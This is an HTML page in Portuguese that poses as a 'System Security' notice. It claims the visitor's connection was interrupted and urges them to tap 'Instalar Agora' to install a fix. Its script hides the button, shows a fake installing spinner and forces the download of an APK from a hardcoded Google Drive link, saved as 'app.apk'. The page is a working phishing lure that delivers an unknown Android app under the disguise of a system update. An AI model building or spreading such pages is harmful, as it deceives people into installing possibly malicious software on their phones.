<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Atualização do Sistema</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background-color: #e3f2fd; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .box { 
            background: white; 
            padding: 40px; 
            border-radius: 15px; 
            text-align: center; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.1); 
            max-width: 90%; 
            width: 320px;
        }
        h2 { 
            color: #1976d2; 
            margin-top: 0; 
            font-size: 22px;
        }
        p { 
            color: #555; 
            font-size: 14px; 
            line-height: 1.5;
        }
        .btn { 
            background-color: #1976d2; 
            color: white; 
            border: none; 
            padding: 15px 30px; 
            font-size: 16px; 
            font-weight: bold;
            border-radius: 8px; 
            cursor: pointer; 
            width: 100%; 
            margin-top: 15px;
            transition: background 0.3s;
        }
        .btn:hover {
            background-color: #1565c0;
        }
        .loader { 
            display: none; 
            margin-top: 15px; 
            color: #1976d2; 
            font-size: 14px; 
            font-weight: 500; 
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #1976d2;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-right: 10px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="box">
        <h2>🛡️ Segurança do Sistema</h2>
        <p>Sua conexão foi interrompida. Toque abaixo para instalar a correção necessária e continuar.</p>
        
        <!-- Botão Principal -->
        <button class="btn" id="installBtn" onclick="iniciarInstalacao()">Instalar Agora</button>
        
        <!-- Mensagem de Loading -->
        <div class="loader" id="loader">
            <div class="spinner"></div> Baixando e instalando...
        </div>
    </div>

    <script>
        // --- CONFIGURAÇÃO ---
        // LINK DIRETO DO GOOGLE DRIVE (JÁ CONFIGURADO)
        const apkName = 'https://drive.google.com/uc?export=download&id=1eqGiasWvAhGCyUyD_JbHlw-i_ib32Ey-'; 

        function iniciarInstalacao() {
            // 1. Esconde o botão e mostra o loader
            document.getElementById('installBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            // 2. Tenta forçar o download direto
            // Como é um link externo (Drive), o intent não funciona bem. 
            // Vamos forçar o download direto.
            
            const link = document.createElement('a');
            link.href = apkName;
            link.download = 'app.apk'; // Nome que o arquivo vai ter no celular
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }
    </script>

</body>
</html>
